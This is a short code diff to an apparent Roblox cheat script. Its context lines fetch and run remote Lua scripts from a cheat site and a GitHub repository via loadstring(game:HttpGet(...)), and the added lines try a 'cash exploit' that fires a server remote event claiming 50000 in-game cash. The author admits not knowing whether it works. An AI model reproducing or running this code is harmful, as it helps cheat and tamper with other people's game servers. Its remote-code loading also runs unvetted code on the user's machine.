@@ -23,3 +23,9 @@ loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Fly.txt", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ButterHub/ButterHub/main/ButterHubSource.lua"), true)()
 
 -- Cash exploit soon!
+-- Cash exploit (dont know if it works):
+local args = {
+    [1] = 50000
+}
+
+game:GetService("ReplicatedStorage").CashValueChanged:FireServer(unpack(args))
